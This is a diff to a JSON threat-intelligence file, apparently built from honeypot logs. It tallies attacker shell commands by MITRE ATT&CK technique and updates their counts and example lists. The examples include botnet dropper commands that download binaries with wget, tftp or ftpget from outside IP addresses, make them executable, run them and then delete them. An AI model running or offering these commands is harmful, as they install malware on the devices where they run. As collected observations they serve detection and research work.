@@ -7,8 +7,8 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 74604,
-      "distinct_ips": 109,
+      "count": 74606,
+      "distinct_ips": 110,
       "examples": [
         "echo -e \"\\x47\\x41\\x59\"",
         "cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"",
@@ -24,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 1995,
-      "distinct_ips": 122,
+      "count": 2008,
+      "distinct_ips": 123,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -41,14 +41,14 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 1115,
-      "distinct_ips": 107,
+      "count": 1116,
+      "distinct_ips": 108,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64; rm -rf x86_64"
+        "(wget http://127.0.0.1/wget -O- || busybox wget http://127.0.0.1/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips"
       ]
     },
     {
@@ -136,6 +136,6 @@
       ]
     }
   ],
-  "total_commands": 145060,
-  "matched_commands": 77036
+  "total_commands": 145676,
+  "matched_commands": 77051
 }
